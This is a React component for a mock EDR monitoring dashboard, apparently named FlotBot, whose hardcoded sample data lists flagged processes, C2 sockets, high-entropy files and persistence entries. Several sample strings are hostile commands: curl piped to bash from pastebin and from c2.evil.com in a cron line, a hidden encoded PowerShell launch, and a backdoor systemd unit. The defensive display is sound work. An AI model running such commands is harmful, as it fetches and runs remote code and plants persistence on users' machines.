import React, { useState } from 'react';
import {
  Cpu,
  Network,
  FolderTree,
  KeyRound,
  Eye,
  Globe,
  Terminal,
  FileCode,
  AlertTriangle,
  CheckCircle,
} from 'lucide-react';

export const FlotBotMonitoringView: React.FC = () => {
  const [sensorTab, setSensorTab] = useState<'process' | 'network' | 'filesystem' | 'persistence' | 'browser'>('process');

  const mockProcesses = [
    { pid: 4892, ppid: 1000, name: 'powershell.exe', cpu: '4.2%', memory: '85 MB', status: 'SUSPICIOUS', cmd: 'powershell.exe -w hidden -enc JABzAHIAYwA9...', user: 'NT AUTHORITY\\SYSTEM' },
    { pid: 5120, ppid: 4892, name: 'svchost_updater.exe', cpu: '1.1%', memory: '34 MB', status: 'MALICIOUS', cmd: 'svchost_updater.exe --connect 185.220.101.5:4444', user: 'SYSTEM' },
    { pid: 1024, ppid: 1, name: 'node', cpu: '0.8%', memory: '120 MB', status: 'BENIGN', cmd: 'node server/server.js', user: 'zoro' },
    { pid: 1180, ppid: 1, name: 'chrome', cpu: '12.4%', memory: '680 MB', status: 'BENIGN', cmd: '/opt/google/chrome/chrome', user: 'zoro' },
    { pid: 3411, ppid: 1180, name: 'curl', cpu: '0.1%', memory: '8 MB', status: 'SUSPICIOUS', cmd: 'curl -s http://pastebin.com/raw/malware.sh | bash', user: 'zoro' },
  ];

  const mockSockets = [
    { proto: 'TCP', local: '127.0.0.1:5000', remote: '0.0.0.0:*', state: 'LISTEN', process: 'node (Backend API)', pid: 1024 },
    { proto: 'TCP', local: '192.168.1.105:52180', remote: '185.220.101.5:4444', state: 'ESTABLISHED', process: 'svchost_updater.exe [FLAGGED C2]', pid: 5120 },
    { proto: 'TCP', local: '192.168.1.105:443', remote: '142.250.190.46:443', state: 'ESTABLISHED', process: 'chrome', pid: 1180 },
    { proto: 'UDP', local: '0.0.0.0:5353', remote: '*:*', state: 'ACTIVE', process: 'systemd-resolved', pid: 450 },
  ];

  const mockFiles = [
    { path: '/tmp/.hidden_payload.bin', size: '1.4 MB', entropy: '7.89 (High / Packed)', sha256: 'a1b2c3d4e5f6...7890', status: 'MALICIOUS_ENTROPY' },
    { path: '/etc/systemd/system/backdoor.service', size: '240 B', entropy: '3.42 (Normal)', sha256: 'f8e7d6c5b4a3...1234', status: 'SUSPICIOUS_LOCATION' },
    { path: '/home/zoro/Documents/final_OG/IBM project-OG/FlotBot/data/canary_token.docx', size: '12 KB', entropy: '4.10 (Normal)', sha256: '998877665544...aabb', status: 'CANARY_ACTIVE' },
  ];

  const mockPersistence = [
    { type: 'SYSTEMD_SERVICE', target: '/etc/systemd/system/backdoor.service', cmd: 'ExecStart=/tmp/.hidden_payload.bin', risk: 'CRITICAL', status: 'FLAGGED' },
    { type: 'CRONTAB_ENTRY', target: '/etc/cron.d/updater', cmd: '* * * * * root curl -s http://c2.evil.com/sh | sh', risk: 'HIGH', status: 'FLAGGED' },
    { type: 'REGISTRY_RUN_KEY', target: 'HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run', cmd: 'svchost_updater.exe', risk: 'HIGH', status: 'FLAGGED' },
  ];

  return (
    <div className="space-y-6">
      <div className="flex items-center justify-between">
        <div>
          <h1 className="text-xl font-bold text-white tracking-tight">FlotBot EDR Sensor Telemetry</h1>
          <p className="text-xs text-slate-400 mt-0.5">
            Low-level Platform Abstraction Layer (PAL) multi-sensor telemetry across Processes, Sockets, File Entropies, and System Persistence.
          </p>
        </div>
      </div>

      {/* Sensor Navigation Tabs */}
      <div className="flex flex-wrap gap-2 border-b border-slate-800 pb-3 font-mono text-xs">
        <button
          onClick={() => setSensorTab('process')}
          className={`flex items-center gap-2 px-3.5 py-1.5 rounded-lg transition-all ${
            sensorTab === 'process'
              ? 'bg-indigo-600/30 text-indigo-300 border border-indigo-500/40 font-bold'
              : 'text-slate-400 hover:text-white'
          }`}
        >
          <Cpu className="h-3.5 w-3.5" />
          <span>Process Hierarchy</span>
        </button>

        <button
          onClick={() => setSensorTab('network')}
          className={`flex items-center gap-2 px-3.5 py-1.5 rounded-lg transition-all ${
            sensorTab === 'network'
              ? 'bg-indigo-600/30 text-indigo-300 border border-indigo-500/40 font-bold'
              : 'text-slate-400 hover:text-white'
          }`}
        >
          <Network className="h-3.5 w-3.5" />
          <span>Active Sockets</span>
        </button>

        <button
          onClick={() => setSensorTab('filesystem')}
          className={`flex items-center gap-2 px-3.5 py-1.5 rounded-lg transition-all ${
            sensorTab === 'filesystem'
              ? 'bg-indigo-600/30 text-indigo-300 border border-indigo-500/40 font-bold'
              : 'text-slate-400 hover:text-white'
          }`}
        >
          <FolderTree className="h-3.5 w-3.5" />
          <span>Filesystem & Entropy</span>
        </button>

        <button
          onClick={() => setSensorTab('persistence')}
          className={`flex items-center gap-2 px-3.5 py-1.5 rounded-lg transition-all ${
            sensorTab === 'persistence'
              ? 'bg-indigo-600/30 text-indigo-300 border border-indigo-500/40 font-bold'
              : 'text-slate-400 hover:text-white'
          }`}
        >
          <KeyRound className="h-3.5 w-3.5" />
          <span>Persistence & Registry</span>
        </button>
      </div>

      {/* Tab Panels */}
      {sensorTab === 'process' && (
        <div className="rounded-xl bg-slate-900/70 border border-slate-800 overflow-hidden font-mono text-xs">
          <table className="w-full text-left">
            <thead>
              <tr className="border-b border-slate-800 bg-slate-950/50 text-slate-400 text-[11px]">
                <th className="py-3 px-4">PID (PPID)</th>
                <th className="py-3 px-4">Process Name</th>
                <th className="py-3 px-4">Account User</th>
                <th className="py-3 px-4">CPU / Memory</th>
                <th className="py-3 px-4">EDR Flag</th>
                <th className="py-3 px-4">Command Line Arguments</th>
              </tr>
            </thead>
            <tbody className="divide-y divide-slate-800/60">
              {mockProcesses.map((p) => (
                <tr key={p.pid} className="hover:bg-slate-800/30">
                  <td className="py-3 px-4 text-indigo-400 font-bold">{p.pid} <span className="text-slate-500 font-normal">({p.ppid})</span></td>
                  <td className="py-3 px-4 text-white font-bold">{p.name}</td>
                  <td className="py-3 px-4 text-slate-400">{p.user}</td>
                  <td className="py-3 px-4 text-slate-300">{p.cpu} · {p.memory}</td>
                  <td className="py-3 px-4">
                    <span className={`px-2 py-0.5 rounded text-[10px] ${
                      p.status === 'MALICIOUS' ? 'bg-rose-950 text-rose-400 border border-rose-800' : p.status === 'SUSPICIOUS' ? 'bg-amber-950 text-amber-400 border border-amber-800' : 'bg-emerald-950 text-emerald-400 border border-emerald-800'
                    }`}>
                      {p.status}
                    </span>
                  </td>
                  <td className="py-3 px-4 text-slate-400 text-[11px] truncate max-w-xs">{p.cmd}</td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      )}

      {sensorTab === 'network' && (
        <div className="rounded-xl bg-slate-900/70 border border-slate-800 overflow-hidden font-mono text-xs">
          <table className="w-full text-left">
            <thead>
              <tr className="border-b border-slate-800 bg-slate-950/50 text-slate-400 text-[11px]">
                <th className="py-3 px-4">Proto</th>
                <th className="py-3 px-4">Local IP:Port</th>
                <th className="py-3 px-4">Remote IP:Port</th>
                <th className="py-3 px-4">Socket State</th>
                <th className="py-3 px-4">Process Ownership</th>
              </tr>
            </thead>
            <tbody className="divide-y divide-slate-800/60">
              {mockSockets.map((s, idx) => (
                <tr key={idx} className="hover:bg-slate-800/30">
                  <td className="py-3 px-4 text-cyan-400 font-bold">{s.proto}</td>
                  <td className="py-3 px-4 text-slate-200">{s.local}</td>
                  <td className="py-3 px-4 text-slate-300">{s.remote}</td>
                  <td className="py-3 px-4 text-emerald-400">{s.state}</td>
                  <td className="py-3 px-4 text-slate-300">{s.process} <span className="text-slate-500 font-normal">({s.pid})</span></td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      )}

      {sensorTab === 'filesystem' && (
        <div className="rounded-xl bg-slate-900/70 border border-slate-800 overflow-hidden font-mono text-xs">
          <table className="w-full text-left">
            <thead>
              <tr className="border-b border-slate-800 bg-slate-950/50 text-slate-400 text-[11px]">
                <th className="py-3 px-4">File Path</th>
                <th className="py-3 px-4">Size</th>
                <th className="py-3 px-4">Shannon Entropy</th>
                <th className="py-3 px-4">SHA-256 Digest</th>
                <th className="py-3 px-4">Heuristic Flag</th>
              </tr>
            </thead>
            <tbody className="divide-y divide-slate-800/60">
              {mockFiles.map((f, idx) => (
                <tr key={idx} className="hover:bg-slate-800/30">
                  <td className="py-3 px-4 text-white font-bold">{f.path}</td>
                  <td className="py-3 px-4 text-slate-300">{f.size}</td>
                  <td className="py-3 px-4 text-amber-400">{f.entropy}</td>
                  <td className="py-3 px-4 text-slate-400 select-all">{f.sha256}</td>
                  <td className="py-3 px-4">
                    <span className={`px-2 py-0.5 rounded text-[10px] ${
                      f.status === 'MALICIOUS_ENTROPY' ? 'bg-rose-950 text-rose-400' : 'bg-indigo-950 text-indigo-400'
                    }`}>
                      {f.status}
                    </span>
                  </td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      )}

      {sensorTab === 'persistence' && (
        <div className="rounded-xl bg-slate-900/70 border border-slate-800 overflow-hidden font-mono text-xs">
          <table className="w-full text-left">
            <thead>
              <tr className="border-b border-slate-800 bg-slate-950/50 text-slate-400 text-[11px]">
                <th className="py-3 px-4">Mechanism</th>
                <th className="py-3 px-4">Registry Key / Unit Path</th>
                <th className="py-3 px-4">Command Payload</th>
                <th className="py-3 px-4">Risk Severity</th>
                <th className="py-3 px-4">Detection Status</th>
              </tr>
            </thead>
            <tbody className="divide-y divide-slate-800/60">
              {mockPersistence.map((p, idx) => (
                <tr key={idx} className="hover:bg-slate-800/30">
                  <td className="py-3 px-4 text-indigo-400 font-bold">{p.type}</td>
                  <td className="py-3 px-4 text-white">{p.target}</td>
                  <td className="py-3 px-4 text-slate-300 truncate max-w-xs">{p.cmd}</td>
                  <td className="py-3 px-4">
                    <span className={`px-2 py-0.5 rounded text-[10px] ${p.risk === 'CRITICAL' ? 'bg-rose-950 text-rose-400' : 'bg-amber-950 text-amber-400'}`}>
                      {p.risk}
                    </span>
                  </td>
                  <td className="py-3 px-4 text-rose-400 font-bold">{p.status}</td>
                </tr>
              ))}
            </tbody>
          </table>
        </div>
      )}
    </div>
  );
};
